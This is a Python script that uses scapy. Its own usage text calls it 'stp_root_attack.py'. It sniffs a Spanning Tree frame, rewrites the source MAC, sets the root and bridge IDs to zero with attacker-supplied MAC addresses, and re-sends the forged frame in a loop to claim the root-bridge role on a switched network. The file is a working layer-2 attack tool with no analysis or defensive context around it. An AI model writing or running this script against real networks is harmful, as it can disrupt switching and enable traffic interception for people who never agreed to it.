
from scapy.all import *
from argparse import ArgumentParser

def main():
    parser = ArgumentParser()
    parser.add_argument('--src-mac', '-src', help='Source MAC address')
    parser.add_argument('--dest-mac', '-dest', help='destinition MAC address')
    parser.add_argument('--root-mac', '-rt', help='root MAC address')
    parser.add_argument('--bridge-mac', '-bg', help='bridge MAC address')
    parser.add_argument('--count', '-c', help='number of frames to be sent')
    parser.epilog = "Usage: py stp_root_attack.py -src 01:80:c2:00:00:00 -dest 01:80:c2:00:00:00 -rt 01:80:c2:00:00:00 -bg 01:80:c2:00:00:00 -c 50"
    
    args = parser.parse_args()
    if args.src_mac is not None:
        if args.dest_mac is not None:
            if args.root_mac is not None:
                if args.bridge_mac is not None:
                    count = 0
                    if args.count is None:
                        print("You didn't set count using -c flag so it is set to 50 by default")
                        count = 50
                    else:
                        count = int(args.count)
                    #Capture STP frame
                    pkt = sniff(filter=f"ether dst {args.dest_mac}",count=1)    
                    #Change the MAC address in the frame to the following:
                    pkt[0].src=args.src_mac
                    #Set Rootid
                    pkt[0].rootid=0
                    #Set rootmac
                    pkt[0].rootmac=args.root_mac
                    #Set Bridgeid
                    pkt[0].bridgeid=0  
                    #Set rootmac
                    pkt[0].bridgemac=args.bridge_mac
                    #Show changed frame
                    pkt[0].show()
                    #Loop to send multiple frames into the network:
                    for i in range (0, count):
                        #Send changed frame back into the network:
                        sendp(pkt[0], loop=0, verbose=1)
                        #Sleep / wait for one second:
                        time.sleep(1)
                else:
                    print('[-]Please, use --bridge-mac or -bg to set a Bridge MAC Address!')
                    print('[!]Example: -bg 01:80:c2:00:00:00')
                    print('[?] -h for help')
                    sys.exit(1)
            else:
                print('[-]Please, use --root-mac or -rt to set a Root MAC Address!')
                print('[!]Example: -rt 01:80:c2:00:00:00')
                print('[?] -h for help')
                sys.exit(1)
        else:
            print('[-]Please, use --dest-mac or -dest to set a Destinition MAC Address!')
            print('[!]Example: -dest 01:80:c2:00:00:00')
            print('[?] -h for help')
            sys.exit(1)
    else:
        print('[-]Please, use --src-mac or -src to set a source MAC Address!')
        print('[!]Example: -src 01:80:c2:00:00:00')
        print('[?] -h for help')
        sys.exit(1)

main()
sys.exit(0)
